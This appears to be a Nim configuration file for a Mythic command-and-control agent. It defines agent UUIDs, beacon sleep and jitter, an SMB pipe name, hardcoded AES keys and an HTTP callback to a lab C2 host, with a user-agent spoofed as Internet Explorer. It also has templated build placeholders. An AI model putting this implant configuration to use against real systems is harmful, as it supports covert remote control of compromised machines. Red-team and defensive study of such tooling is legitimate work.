import structs
from puppy import Header



#[

  This file will contain all the agent- and connection
  information (as public variables) to be accassible to
  all functions/commands/...

]#


# This is for the Dev Build

when defined(DEVENV):
  var
    agent* = AgentInformation(
      #uuid: "b5eedb7b-a459-4221-b344-bdd6cc3da8af",  # SMB (isCheckedIn: true)
      #uuid: "2cb0f608-159b-49ed-a5c1-4e6ee1307c48",  # SMB (isCheckedIn: false)
      #uuid: "37f35444-56a5-4d31-bc7f-0909b93b1b90",   # HTTP (isCheckedIn: true)
      uuid: "a3d8539f-62cf-4405-8d20-f7eadebf90f0",   # HTTP (isCheckedIn: false)
      isCheckedIn: false,
      sleepTimeMS: 1000,
      jitterPer: 30,
    )

  when defined(PROFILE_SMB):
    var
      connection*  = ConnectionInformation(
        uuid: agent.uuid,
        pipeName: "q6o4fxut-q7dv-ikx1-g4r6-4i7hr596vltu",
        encryptionKey: "DrpnJ/TOMe8ApNN7Ji2ak7gYr2XCr3XYW1EBMlVnDs4=",
        transferBytesUp: 32000,
        transferBytesDown: 32000,
      )
  else:
    var
      connection*  = ConnectionInformation(
        uuid: agent.uuid,
        #remoteEndpoint: "http://c2.offensive.ecorp.local",
        remoteEndpoint: "http://10.42.30.10",
        postEndpoint: "data",
        getEndpoint: "",
        getQueryParameter: "q",
        httpHeaders: @[Header(key: "user-agent", value: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"),],
        encryptionKey: "IsOejCM9N2ezVj6ejytf05a8Kr8ri4rzKm3v9nplEbQ=",
        transferBytesUp: 312000,
        transferBytesDown: 312000
      )


# This is for the Automatic Build from the Mythic UI


when defined(MYTHIC_BUILD):
  var agent* = AgentInformation(
      uuid: "{{payload_uuid}}",
      isCheckedIn: false,
      sleepTimeMS: {{callback_interval}}*1000,
      jitterPer: {{callback_jitter}}
    )

  when defined(PROFILE_SMB):
    var connection*  = ConnectionInformation(
        uuid: agent.uuid,
        pipeName: "{{pipename}}",
        encryptionKey: "{{AESPSK}}"
      )
  else:
    var connection*  = ConnectionInformation(
      uuid: agent.uuid,
      #remoteEndpoint: "http://c2.offensive.ecorp.local",
      remoteEndpoint: "{{callback_host}}",
      callbackPort: {{callback_port}},
      postEndpoint: "{{post_uri}}",
      getEndpoint: "{{get_uri}}",
      getQueryParameter: "{{query_path_name}}",
      httpHeaders: @[Header(key: "user-agent", value: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"),],
      encryptionKey: "{{AESPSK}}",
      transferBytesUp: 312000,
      transferBytesDown: 312000
    )

